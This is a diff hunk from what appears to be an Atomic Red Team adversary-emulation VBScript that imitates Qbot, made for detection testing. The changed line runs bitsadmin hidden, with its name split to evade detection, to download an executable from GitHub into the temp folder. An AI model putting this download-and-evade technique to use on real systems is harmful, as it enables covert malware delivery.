@@ -19,7 +19,7 @@ localFile = fso.GetSpecialFolder(2) & "\Atomic_Qbot.exe"
 
 '   Tactic: Command and Control
 '   Technique: T1105 - Remote File Copy
-bitsadminReturn = shell.Run("bit"&"sadmin /transfer qcxjb" & Second(Now) & " /Priority HIGH " & "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello.i686.exe " & localFile, 0, True)
+bitsadminReturn = shell.Run("bit"&"sadmin /transfer qcxjb" & Second(Now) & " /Priority HIGH " & "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Chain_Reactions/atomic-hello.exe " & localFile, 0, True)
 
 '   Tactic: Defense Evasion
 '   Technique: T1036 - Masquerading
